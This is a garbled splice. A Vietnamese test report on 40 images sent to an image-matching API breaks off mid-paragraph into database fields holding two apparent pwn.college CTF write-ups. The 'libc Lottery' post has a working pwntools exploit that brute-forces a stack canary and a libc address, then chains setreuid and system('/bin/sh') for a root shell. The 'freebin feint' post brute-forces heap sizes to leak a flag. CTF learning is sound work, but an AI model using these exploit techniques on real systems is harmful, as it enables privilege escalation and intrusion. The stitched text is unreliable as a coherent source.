# Thực nghiệm 40 ảnh trên máy chủ Tem Vân Giấy

Thời điểm: 04/11/2026, giờ Việt Nam. Máy chủ https://tem-van-giay.onrender.com, API version 0.6.0, số mẫu máy chủ báo 33, ngưỡng 0.64, khoảng cách 0.08.

Số yêu cầu đã ghi: 40/40. Các trường hợp lỗi, không đủ điều kiện hoặc mơ hồ được tách khỏi kết luận nhận nhầm.

## Kết quả

| Nhóm | Kết quả | Số lượng |
|---|---|---:|
| chua_dk | khong nhan | 10 |
| da_dk | dung | 30 |

## Cách thử và giới hạn

Mỗi ảnh được xoay theo EXIF, thu nhỏ cạnh dài tối đa 1.200 pixel và nén JPEG chất lượng 90 bằng Pillow, gửi lần lượt tới API /api/match với tự tìm viền và explain=false. Cách tiền xử lý gần giống giao diện web, không bảo đảm từng pixel giống trình duyệt. API và dữ liệu tham chiếu là trên máy chủ thật; đây là thử API, không phải thao tác hoặc ảnh chụp màn hình trình duyệt.

Tên ảnh đã đăng ký được đối chiếu với mã N01-MAU-001 đến N01-MAU-030 theo lần nhập trước. 30 ảnh da_dk trùng nội dung với ảnh gốc trong ZIP Nhóm 01: đây là thử lại ảnh nguồn đã đăng ký, không phải 30 lần chụp mới độc lập. 10 ảnh chua_dk theo thông tin người dùng là chưa đăng ký. posts.title: libc Lottery
posts.summary: what I've done while doing libc lottery in pwn college
posts.body:
## Initial Analysis

The program listens for connections on `127.0.0.1:1337`. Its output indicates that it accepts an unlimited number of connections, similar to the previous challenge, ROP Roulette.

After running `checksec`, I found that PIE, stack canaries, and NX were enabled. My initial plan was to brute-force the canary and then recover an address inside libc.

Since the vulnerable code was in `main`, I expected its saved return address to point into libc startup code. However, I still needed to identify the exact offset of that address relative to the libc base.

## Exploitation Attempt

I recovered the canary without much difficulty, but I struggled to determine the libc offset.

I asked an AI assistant for help, and it suggested inspecting the `__libc_start_main` symbol with:

```bash
readelf -sW /lib/x86_64-linux-gnu/libc.so.6 | grep __libc_start_main
```

The command returned:

```text
2238: 0000000000023f90   483 FUNC    GLOBAL DEFAULT   15 __libc_start_main@@GLIBC_2.2.5
```

This gave me `0x23f90` as the symbol value for `__libc_start_main` in the libc file I inspected. I initially used it as the offset for my libc-base calculation.

Assuming a libc base aligned to a `0x1000` page boundary, the runtime address of this symbol would end in `f90`. Based on that assumption, I fixed the least significant byte to `0x90` during the brute-force attempt.

I thought this would be enough, but the resulting base calculation did not work. I had encountered similar discrepancies in previous challenges, where the working offset differed from my initial value by exactly `0x1000`. I therefore tried `0x24f90`, and the exploit worked with that value.

At this point, I had a working result, but I had not yet explained the discrepancy. I still needed to verify which libc address I had recovered and why using the adjusted offset worked.

After asking an AI assistant, I realized that the address I had leaked was not the entry address of `__libc_start_main`, which explained why using the symbol’s offset did not work. To determine the correct offset, I needed to inspect the disassembly of libc’s startup code and identify the exact instruction corresponding to the leaked address.

## Expolit script


```python
#!/usr/bin/python3

from pwn import *
context.arch = 'amd64'

import subprocess

def kill_babyrop_processes():
    try:
        pids = subprocess.check_output(
            ["pgrep", "-f", "libc-lottery-hard"],
            stderr=subprocess.DEVNULL,
        ).decode().split()
        if len(pids) > 1:
            subprocess.run(["kill", "-9", pids[1]], check=True)
            print(f"[+] Killed PID {pids[1]}")
    except subprocess.CalledProcessError:
        pass

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec = False)

padding = b'A' * 0x48

#brute force canary
x = 0x00
canary = b''
while True:
    p = remote('127.0.0.1', 1337)
    # *** stack smashing detected ***: terminated
    # Leaving!
    ### Goodbye!
    if x > 255:
        x = 0
    y = p8(x)
    x += 1
    tmp = canary + y
    payload = padding + tmp
    p.send(payload)
    p.recvuntil(b'### Goodbye!')
    out = p.recvall()
    if b'*** stack smashing detected ***: terminated' not in out:
        canary += y
        x = 0
        if len(canary) == 8:
            break

log.info("canary leak: " + hex(u64(canary)))
pause()
#brute force main addr
x = 0x00
libc_addr = p8(0x90)
#0x7fa263c33f0a
while True:
    p = remote('127.0.0.1', 1337)
    if x > 255:
        x = 0
    y = p8(x)
    x += 1
    tmp = libc_addr + y
    payload = padding + canary + p64(0) + tmp
    p.send(payload)
    out = p.recvall(1)
    if b'### Welcome' in out:
        libc_addr += y
        x = 0
        if len(libc_addr) == 8:
            break
    kill_babyrop_processes()

log.info("libc address leak: " + hex(u64(libc_addr)))
pause()
kill_babyrop_processes()
#leak libc
offset = 0x24f90
libc.address = u64(libc_addr) - offset
sys = libc.symbols['system']
setreuid = libc.symbols['setreuid']
binsh = next(libc.search(b'/bin/sh'))
rop = ROP(libc)
rop.raw(rop.rdi)
rop.raw(0)
rop.raw(rop.rsi)
rop.raw(0)
rop.raw(setreuid)
rop.raw(rop.rdi)
rop.raw(binsh)
rop.raw(sys)

payload = padding + canary + p64(0) + rop.chain()
p = remote('127.0.0.1', 1337)
p.send(payload)
p.interactive()
```

posts.title: freebin feint(hard)
posts.summary: What I've done during solve freebin feint(hard) in pwn college
posts.body:
## What I've done and thinked

For this problem, the binary don't leak the flag size anymore, so the old approach can't use here(3 previous problem). First I think it's a random problem so I keep repeat the chain: malloc -> size -> free -> read_flag -> puts every with new process, but it didn't work. After reading the write up I figure out that I can spam the chain in the same process like libc lottery :) so the solution is just brute force the size and get the flag.

## After get the flag
keep reading the write up and learnt that I just need to loop for 63 times. Because the chunk size be calculated by this equation: (request + 8 + 15) % 15 so the chunk size always divisible by 16 so we can begin with 32 and plus 16 every time

## Exploit script


```python
#!/usr/bin/python3 

from pwn import * 

context.binary = exe = ELF('/challenge/freebin-feint-hard', checksec = False)

p = process(exe.path)

for i in range(128, 1000):
    size = i 
    size = str(size).encode('ascii')
    p.sendlineafter(b'(malloc/free/puts/read_flag/quit):', b'malloc');
    p.sendlineafter(b'Size:', size)
    p.sendlineafter(b'(malloc/free/puts/read_flag/quit):', b'free')
    p.sendlineafter(b'(malloc/free/puts/read_flag/quit):',b'read_flag')
    p.sendlineafter(b'(malloc/free/puts/read_flag/quit):',b'puts')
    p.recvuntil(b'Data:') 
    out = p.recvline()
    if b'pwn.college' in out: 
        print(out)
        break

p.interactive()
```
